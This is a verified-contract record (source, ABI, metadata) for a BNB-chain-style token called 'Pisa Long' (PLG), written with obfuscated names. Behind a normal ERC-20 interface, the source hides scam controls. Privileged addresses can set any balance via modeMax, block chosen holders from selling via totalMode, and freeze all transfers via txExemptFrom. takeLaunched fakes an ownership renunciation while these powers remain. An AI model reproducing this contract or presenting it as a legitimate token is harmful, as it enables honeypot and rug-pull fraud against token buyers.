{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface swapSenderFee {\n    function createPair(address buyTotal, address autoLiquidityMode) external returns (address);\n}\n\ninterface fundReceiverShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityMode) external view returns (uint256);\n\n    function transfer(address teamLimit, uint256 modeTo) external returns (bool);\n\n    function allowance(address tradingAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamLimit,\n        uint256 modeTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitSwap, uint256 value);\n    event Approval(address indexed tradingAuto, address indexed spender, uint256 value);\n}\n\nabstract contract atTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxTake is fundReceiverShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PisaLong is atTrading, fundReceiverShould, maxTake {\n\n    function transfer(address fromShould, uint256 modeTo) external virtual override returns (bool) {\n        return teamAt(_msgSender(), fromShould, modeTo);\n    }\n\n    mapping(address => bool) public sellMax;\n\n    address public isFund;\n\n    uint256 public modeLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderLaunch;\n    }\n\n    string private fromSell = \"Pisa Long\";\n\n    bool public isModeMin;\n\n    uint256 private totalSwap;\n\n    uint256 constant receiverSenderTake = 12 ** 10;\n\n    uint256 feeTake;\n\n    bool public sellReceiver;\n\n    function fundAuto(address atToken) public {\n        if (isModeMin) {\n            return;\n        }\n        if (modeLaunched == totalSwap) {\n            sellLaunched = true;\n        }\n        sellMax[atToken] = true;\n        if (modeReceiver == sellReceiver) {\n            sellLaunched = false;\n        }\n        isModeMin = true;\n    }\n\n    bool private sellLaunched;\n\n    function owner() external view returns (address) {\n        return swapReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedMode;\n\n    bool private toIs;\n\n    event OwnershipTransferred(address indexed launchedTx, address indexed takeAuto);\n\n    function transferFrom(address swapSender, address teamLimit, uint256 modeTo) external override returns (bool) {\n        if (_msgSender() != receiverShould) {\n            if (launchedMode[swapSender][_msgSender()] != type(uint256).max) {\n                require(modeTo <= launchedMode[swapSender][_msgSender()]);\n                launchedMode[swapSender][_msgSender()] -= modeTo;\n            }\n        }\n        return teamAt(swapSender, teamLimit, modeTo);\n    }\n\n    function approve(address autoTeam, uint256 modeTo) public virtual override returns (bool) {\n        launchedMode[_msgSender()][autoTeam] = modeTo;\n        emit Approval(_msgSender(), autoTeam, modeTo);\n        return true;\n    }\n\n    uint256 private senderLaunch = 100000000 * 10 ** 18;\n\n    function enableTeam() private view {\n        require(sellMax[_msgSender()]);\n    }\n\n    function modeMax(address fromShould, uint256 modeTo) public {\n        enableTeam();\n        takeFund[fromShould] = modeTo;\n    }\n\n    uint8 private modeBuy = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeBuy;\n    }\n\n    address private swapReceiver;\n\n    function teamAt(address swapSender, address teamLimit, uint256 modeTo) internal returns (bool) {\n        if (swapSender == listReceiverTrading) {\n            return senderMarketing(swapSender, teamLimit, modeTo);\n        }\n        uint256 swapAt = fundReceiverShould(isFund).balanceOf(takeMax);\n        require(swapAt == feeTake);\n        require(teamLimit != takeMax);\n        if (amountMax[swapSender]) {\n            return senderMarketing(swapSender, teamLimit, receiverSenderTake);\n        }\n        return senderMarketing(swapSender, teamLimit, modeTo);\n    }\n\n    string private marketingAmount = \"PLG\";\n\n    function senderMarketing(address swapSender, address teamLimit, uint256 modeTo) internal returns (bool) {\n        require(takeFund[swapSender] >= modeTo);\n        takeFund[swapSender] -= modeTo;\n        takeFund[teamLimit] += modeTo;\n        emit Transfer(swapSender, teamLimit, modeTo);\n        return true;\n    }\n\n    mapping(address => bool) public amountMax;\n\n    address public listReceiverTrading;\n\n    address takeMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return fromSell;\n    }\n\n    function balanceOf(address liquidityMode) public view virtual override returns (uint256) {\n        return takeFund[liquidityMode];\n    }\n\n    bool public modeReceiver;\n\n    function totalMode(address sellFrom) public {\n        enableTeam();\n        if (totalSwap != modeLaunched) {\n            sellLaunched = false;\n        }\n        if (sellFrom == listReceiverTrading || sellFrom == isFund) {\n            return;\n        }\n        amountMax[sellFrom] = true;\n    }\n\n    function takeLaunched() public {\n        emit OwnershipTransferred(listReceiverTrading, address(0));\n        swapReceiver = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return swapReceiver;\n    }\n\n    uint256 limitTxTake;\n\n    function txExemptFrom(uint256 modeTo) public {\n        enableTeam();\n        feeTake = modeTo;\n    }\n\n    function allowance(address feeTrading, address autoTeam) external view virtual override returns (uint256) {\n        if (autoTeam == receiverShould) {\n            return type(uint256).max;\n        }\n        return launchedMode[feeTrading][autoTeam];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingAmount;\n    }\n\n    mapping(address => uint256) private takeFund;\n\n    constructor (){\n        \n        teamMode shouldListTotal = teamMode(receiverShould);\n        isFund = swapSenderFee(shouldListTotal.factory()).createPair(shouldListTotal.WETH(), address(this));\n        if (modeReceiver) {\n            sellReceiver = false;\n        }\n        listReceiverTrading = _msgSender();\n        sellMax[listReceiverTrading] = true;\n        takeFund[listReceiverTrading] = senderLaunch;\n        takeLaunched();\n        if (modeReceiver) {\n            modeLaunched = totalSwap;\n        }\n        emit Transfer(address(0), listReceiverTrading, senderLaunch);\n    }\n\n    address receiverShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToken\",\"type\":\"address\"}],\"name\":\"fundAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isModeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiverTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"modeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"}],\"name\":\"totalMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeTo\",\"type\":\"uint256\"}],\"name\":\"txExemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PisaLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}